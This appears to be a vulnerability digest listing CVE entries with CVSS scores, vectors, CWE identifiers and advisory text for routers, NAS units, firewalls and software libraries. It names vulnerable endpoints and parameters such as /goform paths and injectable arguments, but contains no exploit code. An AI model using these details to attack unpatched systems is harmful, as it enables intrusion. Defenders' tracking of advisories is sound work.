### CVE-2025-14709

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-12-15T07:02:07.039Z |

A security vulnerability has been detected in Shiguangwu sgwbox N3 2.0.25. Affected by this issue is some unknown functionality of the file /usr/sbin/http_eshell_server of the component WIRELESSCFGGET Interface. The manipulation of the argument params leads to buffer overflow. Remote exploitation of the attack is possible. The exploit has been disclosed publicly and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-14708

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-12-15T06:32:06.485Z |

A weakness has been identified in Shiguangwu sgwbox N3 2.0.25. Affected by this vulnerability is an unknown functionality of the file /usr/sbin/http_eshell_server of the component WIREDCFGGET Interface. Executing manipulation of the argument params can lead to buffer overflow. The attack may be launched remotely. The exploit has been made available to the public and could be exploited. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-14707

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-12-15T06:02:06.636Z |

A security flaw has been discovered in Shiguangwu sgwbox N3 2.0.25. Affected is an unknown function of the file /usr/sbin/http_eshell_server of the component DOCKER Feature. Performing manipulation of the argument params results in command injection. The attack may be initiated remotely. The exploit has been released to the public and may be exploited. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-14706

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-12-15T05:32:05.553Z |

A vulnerability was identified in Shiguangwu sgwbox N3 2.0.25. This impacts an unknown function of the file /usr/sbin/http_eshell_server of the component NETREBOOT Interface. Such manipulation leads to command injection. The attack can be launched remotely. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-14705

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-12-15T05:02:06.394Z |

A vulnerability was determined in Shiguangwu sgwbox N3 2.0.25. This affects an unknown function of the component SHARESERVER Feature. This manipulation of the argument params causes command injection. The attack can be initiated remotely. The exploit has been publicly disclosed and may be utilized. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-14535

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-12-11T19:32:05.964Z |

A vulnerability was identified in UTT 进取 512W up to 3.1.7.7-171114. Affected is the function strcpy of the file /goform/formConfigFastDirectionW. The manipulation of the argument ssid leads to buffer overflow. The attack may be initiated remotely. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-14534

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-12-11T19:02:06.276Z |

A vulnerability was determined in UTT 进取 512W up to 3.1.7.7-171114. This impacts the function strcpy of the file /goform/formNatStaticMap of the component Endpoint. Executing manipulation of the argument NatBind can lead to buffer overflow. The attack can be launched remotely. The exploit has been publicly disclosed and may be utilized. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-34513

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78` |
| Published | 2025-10-16T17:53:34.729Z |

Ilevia EVE X1 Server firmware versions ≤ 4.7.18.0.eden contain an OS command injection vulnerability in mbus_build_from_csv.php that allows an unauthenticated attacker to execute arbitrary code. Ilevia has declined to service this vulnerability, and recommends that customers not expose port 8080 to the internet.

### CVE-2025-11418

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-10-08T00:02:07.614Z |

A security vulnerability has been detected in Tenda CH22 up to 1.0.0.1. This issue affects the function formWrlsafeset of the file /goform/AdvSetWrlsafeset of the component HTTP Request Handler. The manipulation of the argument mit_ssid_index leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed publicly and may be used.

### CVE-2025-11005

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:H/SC:H/SI:L/SA:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-09-25T20:17:45.856Z |

Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in TOTOLINK X6000R allows OS Command Injection.This issue affects X6000R: through V9.4.0cu.1458_B20250708.

### CVE-2025-10432

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-09-15T07:32:07.178Z |

A vulnerability was found in Tenda AC1206 15.03.06.23. This vulnerability affects the function check_param_changed of the file /goform/AdvSetMacMtuWa of the component HTTP Request Handler. Performing manipulation of the argument wanMTU results in stack-based buffer overflow. Remote exploitation of the attack is possible. The exploit has been made public and could be used.

### CVE-2025-2611

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:L/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-08-05T15:00:32.531Z |

The ICTBroadcast application unsafely passes session cookie data to shell processing, allowing an attacker to inject shell commands into a session cookie that get executed on the server. This results in unauthenticated remote code execution in the session handling.




Versions 7.4 and below are known to be vulnerable.

### CVE-2025-34132

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78;CWE-20` |
| Published | 2025-07-16T21:26:51.852Z |

A command injection vulnerability exists in LILIN Digital Video Recorder (DVR) devices prior to firmware version 2.0b60_20200207 via the Server field in the NTPUpdate configuration. The web service at /z/zbin/dvr_box fails to properly sanitize input, allowing remote attackers to inject and execute arbitrary commands as root by supplying specially crafted XML data to the DVRPOST interface.

### CVE-2025-2777

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L` |
| Weaknesses | `CWE-611` |
| Published | 2025-05-07T14:53:00.712Z |

SysAid On-Prem versions <= 23.3.40 are vulnerable to an unauthenticated XML External Entity (XXE) vulnerability in the lshw processing functionality,  allowing for administrator account takeover and file read primitives.

### CVE-2025-2776

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L` |
| Weaknesses | `CWE-611` |
| Published | 2025-05-07T14:50:40.717Z |

SysAid On-Prem versions <= 23.3.40 are vulnerable to an unauthenticated XML External Entity (XXE) vulnerability in the Server URL processing functionality, allowing for administrator account takeover and file read primitives.

### CVE-2025-2775

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L` |
| Weaknesses | `CWE-611` |
| Published | 2025-05-07T14:43:23.817Z |

SysAid On-Prem versions <= 23.3.40 are vulnerable to an unauthenticated XML External Entity (XXE) vulnerability in the Checkin processing functionality,  allowing for administrator account takeover and file read primitives.

### CVE-2025-34028

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:H/SC:L/SI:H/SA:H` |
| Weaknesses | `CWE-22;CWE-306` |
| Published | 2025-04-22T16:32:23.446Z |

The Commvault Command Center Innovation Release allows an unauthenticated actor to upload ZIP files that represent install packages that, when expanded by the target server, are vulnerable to path traversal vulnerability that can result in Remote Code Execution via malicious JSP.





This issue affects Command Center Innovation Release: 11.38.0 to 11.38.20. The vulnerability is fixed in 11.38.20 with SP38-CU20-433 and SP38-CU20-436 and also fixed in 11.38.25 with SP38-CU25-434 and SP38-CU25-438.

### CVE-2024-48887

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:X/RC:C` |
| Weaknesses | `CWE-620` |
| Published | 2025-04-08T16:52:02.152Z |

A  unverified password change vulnerability in Fortinet FortiSwitch GUI may allow a remote unauthenticated attacker to change admin passwords via a specially crafted request

### CVE-2025-29775

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-347` |
| Published | 2025-03-14T17:11:05.590Z |

xml-crypto is an XML digital signature and encryption library for Node.js. An attacker may be able to exploit a vulnerability in versions prior to 6.0.1, 3.2.1, and 2.1.6 to bypass authentication or authorization mechanisms in systems that rely on xml-crypto for verifying signed XML documents. The vulnerability allows an attacker to modify a valid signed XML message in a way that still passes signature verification checks. For example, it could be used to alter critical identity or access control attributes, enabling an attacker to escalate privileges or impersonate another user. Users of versions 6.0.0 and prior should upgrade to version 6.0.1 to receive a fix. Those who are still using v2.x or v3.x should upgrade to patched versions 2.1.6 or 3.2.1, respectively.

### CVE-2025-29774

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-347` |
| Published | 2025-03-14T17:05:53.943Z |

xml-crypto is an XML digital signature and encryption library for Node.js. An attacker may be able to exploit a vulnerability in versions prior to 6.0.1, 3.2.1, and 2.1.6 to bypass authentication or authorization mechanisms in systems that rely on xml-crypto for verifying signed XML documents. The vulnerability allows an attacker to modify a valid signed XML message in a way that still passes signature verification checks. For example, it could be used to alter critical identity or access control attributes, enabling an attacker with a valid account to escalate privileges or impersonate another user. Users of versions 6.0.0 and prior should upgrade to version 6.0.1 to receive a fix. Those who are still using v2.x or v3.x should upgrade to patched versions 2.1.6 or 3.2.1, respectively.

### CVE-2025-25291

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-347;CWE-436` |
| Published | 2025-03-12T20:16:12.181Z |

ruby-saml provides security assertion markup language (SAML) single sign-on (SSO) for Ruby. An authentication bypass vulnerability was found in ruby-saml prior to versions 1.12.4 and 1.18.0 due to a parser differential. ReXML and Nokogiri parse XML differently; the parsers can generate entirely different document structures from the same XML input. That allows an attacker to be able to execute a Signature Wrapping attack. This issue may lead to authentication bypass. Versions 1.12.4 and 1.18.0 fix the issue.

### CVE-2025-0868

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-95` |
| Published | 2025-02-20T11:26:11.784Z |

A vulnerability, that could result in Remote Code Execution (RCE), has been found in DocsGPT. Due to improper parsing of JSON data using eval() an unauthorized attacker could send arbitrary Python code to be executed via /api/remote endpoint..

This issue affects DocsGPT: from 0.8.1 through 0.12.0.

### CVE-2024-56145

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-94` |
| Published | 2024-12-18T20:37:34.301Z |

Craft is a flexible, user-friendly CMS for creating custom digital experiences on the web and beyond. Users of affected versions are affected by this vulnerability if their php.ini configuration has `register_argc_argv` enabled. For these users an unspecified remote code execution vector is present. Users are advised to update to version 3.9.14, 4.13.2, or 5.5.2. Users unable to upgrade should disable `register_argc_argv` to mitigate the issue.

### CVE-2024-50339

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-79;CWE-287` |
| Published | 2024-12-11T17:48:42.230Z |

GLPI is a free asset and IT management software package. Starting in version 9.5.0 and prior to version 10.0.17, an unauthenticated user can retrieve all the sessions IDs and use them to steal any valid session. Version 10.0.17 contains a patch for this issue.

### CVE-2024-0012

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:N/SA:N/AU:N/R:U/V:C/RE:H/U:Red` |
| Weaknesses | `CWE-306` |
| Published | 2024-11-18T15:47:41.407Z |

An authentication bypass in Palo Alto Networks PAN-OS software enables an unauthenticated attacker with network access to the management web interface to gain PAN-OS administrator privileges to perform administrative actions, tamper with the configuration, or exploit other authenticated privilege escalation vulnerabilities like  CVE-2024-9474 https://security.paloaltonetworks.com/CVE-2024-9474 .

The risk of this issue is greatly reduced if you secure access to the management web interface by restricting access to only trusted internal IP addresses according to our recommended  best practice deployment guidelines https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431 .

This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, PAN-OS 11.1, and PAN-OS 11.2 software.

Cloud NGFW and Prisma Access are not impacted by this vulnerability.

### CVE-2024-9464

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:N/SA:N/AU:N/R:U/V:C/RE:H/U:Amber` |
| Weaknesses | `CWE-78` |
| Published | 2024-10-09T17:03:33.904Z |

An OS command injection vulnerability in Palo Alto Networks Expedition allows an authenticated attacker to run arbitrary OS commands as root in Expedition, resulting in disclosure of usernames, cleartext passwords, device configurations, and device API keys of PAN-OS firewalls.

### CVE-2024-8752

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-22` |
| Published | 2024-09-16T15:42:20.153Z |

The Windows version of WebIQ 2.15.9 is affected by a directory traversal vulnerability that allows remote attackers to read any file on the system.

### CVE-2024-7332

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-259` |
| Published | 2024-08-01T00:31:04.452Z |

A vulnerability was found in TOTOLINK CP450 4.1.0cu.747_B20191224. It has been classified as critical. This affects an unknown part of the file /web_cste/cgi-bin/product.ini of the component Telnet Service. The manipulation leads to use of hard-coded password. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-273255. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2024-5910

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L/AU:Y/R:U/V:D/RE:M/U:Red` |
| Weaknesses | `CWE-306` |
| Published | 2024-07-10T18:39:26.006Z |

Missing authentication for a critical function in Palo Alto Networks Expedition can lead to an Expedition admin account takeover for attackers with network access to Expedition.

Note: Expedition is a tool aiding in configuration migration, tuning, and enrichment. Configuration secrets, credentials, and other data imported into Expedition is at risk due to this issue.

### CVE-2024-27954

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2024-05-17T08:50:36.548Z |

Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in WP Automatic Automatic allows Path Traversal, Server Side Request Forgery.This issue affects Automatic: from n/a through 3.92.0.

### CVE-2023-48788

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C` |
| Weaknesses | `CWE-89` |
| Published | 2024-03-12T15:09:18.527Z |

A improper neutralization of special elements used in an sql command ('sql injection') in Fortinet FortiClientEMS version 7.2.0 through 7.2.2, FortiClientEMS 7.0.1 through 7.0.10 allows attacker to execute unauthorized code or commands via specially crafted packets.

### CVE-2023-34991

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:X/RC:X` |
| Weaknesses | `CWE-89` |
| Published | 2023-11-14T18:07:32.529Z |

A improper neutralization of special elements used in an sql command ('sql injection') in Fortinet FortiWLM version 8.6.0 through 8.6.5 and 8.5.0 through 8.5.4 and 8.4.0 through 8.4.2 and 8.3.0 through 8.3.2 and 8.2.2 allows attacker to execute unauthorized code or commands via a crafted http request.

### CVE-2026-56258

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-06-23T13:16:44.817 |

Crawl4AI before 0.8.8 contains an arbitrary file write vulnerability in the screenshot and PDF endpoints that allows unauthenticated attackers to write files outside the intended directory via symlink and time-of-check-time-of-use (TOCTOU) attacks on the output_path parameter. Remote attackers can exploit insufficient path validation and symlink following to achieve arbitrary file write and potential code execution on systems where the runtime user has write access to executable or cron locations.

### CVE-2026-12866

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-94;CWE-94` |
| Published | 2026-06-23T05:17:03.380 |

All versions of the package expr-eval are vulnerable to Code Execution via the toJSFunction() API. An attacker can execute arbitrary JavaScript by supplying crafted expressions that are compiled into native code using new Function(). Because user-controlled expressions are transformed directly into executable JavaScript, attackers can escape the intended expression sandbox and run arbitrary code within the application's context.

### CVE-2026-56266

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-918` |
| Published | 2026-06-22T22:16:50.937 |

Crawl4AI before 0.8.7 contains a server-side request forgery vulnerability in the /crawl, /crawl/stream, /md, and /llm endpoints that fetch arbitrary user-supplied URLs without validation. Unauthenticated attackers can bypass the internal-address blocklist using IPv6-mapped IPv4 addresses to reach internal services and cloud metadata endpoints.

### CVE-2026-45034

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-06-22T21:16:24.403 |

PhpSpreadsheet is a pure PHP library for reading and writing spreadsheet files. Prior to 1.30.5, CVE-2026-34084 was patched by the helper File::prohibitWrappers. The helper calls parse_url($filename, PHP_URL_SCHEME) and then checks is_string($scheme) && strlen($scheme) > 1 to reject stream wrappers such as phar://, php://, data:// or expect://. The check is not equivalent to "does the path contain a wrapper". When the input has the form phar:///path/file.phar/inner with three or more slashes after the scheme, parse_url returns boolean false instead of returning the scheme string. The is_string($scheme) branch is therefore skipped, the helper returns without throwing, and the caller proceeds. PHP's stream layer, however, still treats phar:///... as a valid phar wrapper and opens the underlying phar file. The result is that IOFactory::load($attackerPath) walks past the patch and still touches the phar wrapper. On PHP 7.x, simply reaching the phar wrapper via is_file is enough for PHP to automatically deserialize the phar metadata, which in turn invokes the magic methods __wakeup and __destruct of an attacker controlled object and gives full RCE. On PHP 8.x, automatic metadata deserialization for plain file ops was removed, so the chain at the PhpSpreadsheet layer reduces to a phar wrapper file read primitive, and RCE only resurfaces if the downstream consumer ever calls Phar::getMetadata. This vulnerability is fixed in 1.30.5.

### CVE-2024-10914

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78;CWE-74;CWE-707` |
| Published | 2024-11-06T13:31:05.242Z |

A vulnerability was found in D-Link DNS-320, DNS-320LW, DNS-325 and DNS-340L up to 20241028. It has been declared as critical. Affected by this vulnerability is the function cgi_user_add of the file /cgi-bin/account_mgr.cgi?cmd=cgi_user_add. The manipulation of the argument name leads to os command injection. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used.

### CVE-2024-9465

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:H/SI:N/SA:N/AU:N/R:U/V:C/RE:H/U:Amber` |
| Weaknesses | `CWE-89` |
| Published | 2024-10-09T17:04:01.720Z |

An SQL injection vulnerability in Palo Alto Networks Expedition allows an unauthenticated attacker to reveal Expedition database contents, such as password hashes, usernames, device configurations, and device API keys. With this, attackers can also create and read arbitrary files on the Expedition system.

### CVE-2024-5217

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-184` |
| Published | 2024-07-10T16:28:32.649Z |

ServiceNow has addressed an input validation vulnerability that was identified in the Washington DC, Vancouver, and earlier Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform. The vulnerability is addressed in the listed patches and hot fixes below, which were released during the June 2024 patching cycle. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.

### CVE-2023-27997

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:X/RC:R` |
| Weaknesses | `CWE-122` |
| Published | 2023-06-13T08:41:47.415Z |

A heap-based buffer overflow vulnerability [CWE-122] in FortiOS version 7.2.4 and below, version 7.0.11 and below, version 6.4.12 and below, version 6.0.16 and below and FortiProxy version 7.2.3 and below, version 7.0.9 and below, version 2.0.12 and below, version 1.2 all versions, version 1.1 all versions SSL-VPN may allow a remote attacker to execute arbitrary code or commands via specifically crafted requests.

### CVE-2026-48746

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-444` |
| Published | 2026-06-22T23:16:30.490 |

vLLM is an inference and serving engine for large language models (LLMs). From 0.3.0 until 0.22.0, a vulnerability in ASGI web servers and starlette's trust on those web servers enables an authentication bypass of the OpenAI API AuthenticationMiddleware. It allows to use the API without providing the configured VLLM_API_KEY or --api-key. This vulnerability is fixed in 0.22.0.

### CVE-2026-56104

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-06-22T16:16:40.227 |

Chainlit before 2.10.1 contains a session hijacking vulnerability that allows unauthenticated attackers to restore and inherit authenticated user sessions by presenting a valid sessionId during WebSocket session restoration without ownership verification. Attackers can exploit the restore_existing_session path to assume a victim's permissions and roles, enabling unauthorized invocation of tools and access to data restricted to the authenticated victim.

### CVE-2026-21643

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` |
| Weaknesses | `CWE-89` |
| Published | 2026-02-06T08:24:43.877Z |

An improper neutralization of special elements used in an sql command ('sql injection') vulnerability in Fortinet FortiClientEMS 7.4.4 may allow an unauthenticated attacker to execute unauthorized code or commands via specifically crafted HTTP requests.

### CVE-2025-2905

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-611` |
| Published | 2025-05-05T09:02:01.489Z |

Due to the improper configuration of XML parser, user-supplied XML is parsed without applying sufficient restrictions, enabling XML External Entity (XXE) resolution in multiple WSO2 Products.

A successful XXE attack could allow a remote, unauthenticated attacker to:
  *  Read sensitive files from the server’s filesystem.
  *  Perform denial-of-service (DoS) attacks, which can render the affected service unavailable.

### CVE-2025-29927

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-285` |
| Published | 2025-03-21T14:34:49.570Z |

Next.js is a React framework for building full-stack web applications. Starting in version 1.11.4 and prior to versions 12.3.5, 13.5.9, 14.2.25, and 15.2.3, it is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware. If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the x-middleware-subrequest header from reaching your Next.js application. This vulnerability is fixed in 12.3.5, 13.5.9, 14.2.25, and 15.2.3.

### CVE-2024-37404

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2024-10-18T23:06:49.502Z |

Improper Input Validation in the admin portal of Ivanti Connect Secure before 22.7R2.1 and 9.1R18.9, or Ivanti Policy Secure before 22.7R1.1 allows a remote authenticated attacker to achieve remote code execution.

### CVE-2024-8956

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-306` |
| Published | 2024-09-17T19:59:27.205Z |

PTZOptics PT30X-SDI/NDI-xx before firmware 6.3.40 is vulnerable to an insufficient authentication issue. The camera does not properly enforce authentication to /cgi-bin/param.cgi when requests are sent without an HTTP Authorization header. The result is a remote and unauthenticated attacker can leak sensitive data such as usernames, password hashes, and configurations details. Additionally, the attacker can update individual configuration values or overwrite the whole file.

### CVE-2024-28987

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-798` |
| Published | 2024-08-21T21:17:23.041Z |

